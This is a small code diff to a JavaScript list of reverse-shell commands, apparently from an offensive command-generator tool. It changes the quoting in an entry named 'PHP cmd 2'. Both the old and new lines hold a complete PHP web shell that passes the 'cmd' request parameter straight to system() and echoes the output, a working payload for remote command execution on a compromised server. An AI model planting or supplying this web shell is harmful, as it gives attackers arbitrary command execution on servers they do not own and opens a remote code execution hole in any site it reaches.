@@ -158,7 +158,7 @@ const reverseShellCommands = withCommandType(
         },
 	{
             "name": "PHP cmd 2",
-            "command": "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"<\/pre>\"; die; }?>",
+            "command": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"<\/pre>\"; die; }?>",
             "meta": ["linux", "windows", "mac"]
         },
 	{
